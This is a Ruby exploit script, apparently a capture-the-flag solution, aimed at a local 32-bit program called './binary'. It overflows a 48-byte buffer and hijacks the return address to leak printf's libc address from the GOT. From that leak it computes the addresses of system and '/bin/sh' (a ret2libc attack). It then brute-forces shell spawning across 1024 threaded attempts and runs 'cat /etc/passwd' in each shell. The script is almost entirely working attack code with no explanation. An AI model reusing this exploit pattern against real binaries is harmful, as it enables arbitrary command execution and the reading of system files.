#!/usr/bin/env ruby
#
require 'open3'
require 'thread/pool'
#
#  `perl -e 'print "a" x 48 . "bbbb" . "cccc" '`
#

i, o, s = Open3.popen2({'LD_LIBRARY_PATH'=>'./libc.so.6'}, './binary')

dumb = 0xdeadbeef
writable_addr = 0x08049204
printf = 0x080484dc
got_printf = 0x08049768

# leak information
puts "Try to leak information"
i.write "a" * 48
i.write [writable_addr].pack("V") # ebp - to control esp after return twice
i.write [printf].pack("V") # eip
i.write [got_printf].pack("V") # second arg
i.puts
# get printf got entry
result = ""
loop do
    result << o.read(1)
    break if result.end_with? "\n"
end

libc_printf = o.read(4).unpack("V")[0]
libc_system = libc_printf - 0xdf50
libc_binsh = libc_system + 0xFE5E4

printf "libc printf: 0x%x\n", libc_printf
printf "libc system: 0x%x\n", libc_system
printf "libc /bin/sh: 0x%x\n", libc_binsh
# exec
puts "Try to execute shell"

pool = Thread.pool 50

1024.times do |index|
    pool.process index do |arg_i|
        puts arg_i
        i, o, s = Open3.popen2('./binary')

        i.write "a" * 48
        i.write [writable_addr].pack("V") # ebp - to control esp after return twice
        i.write [libc_system].pack("V") # eip
        i.write [dumb].pack("V") # second arg
        i.write [libc_binsh].pack("V") # second arg
        i.puts
        sleep 0.5
        begin
            i.puts "cat /etc/passwd > fuckyou"
        rescue
            next
        end
        sleep 0.5
    end
end

pool.shutdown
